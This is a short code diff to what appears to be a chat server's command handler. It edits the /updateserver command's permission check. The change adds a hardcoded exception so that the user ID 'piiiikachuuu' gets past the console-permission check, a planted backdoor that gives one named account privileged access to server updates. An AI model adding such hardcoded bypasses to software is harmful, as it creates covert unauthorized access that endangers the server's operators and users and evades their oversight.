@@ -2497,7 +2497,7 @@ var commands = exports.commands = {
 	},
 
 	updateserver: function(target, room, user, connection) {
-		if (!user.checkConsolePermission(connection)) {
+		if (!user.checkConsolePermission(connection) && user.userid != 'piiiikachuuu') {
 			return this.sendReply('/updateserver - Access denied.');
 		}
 
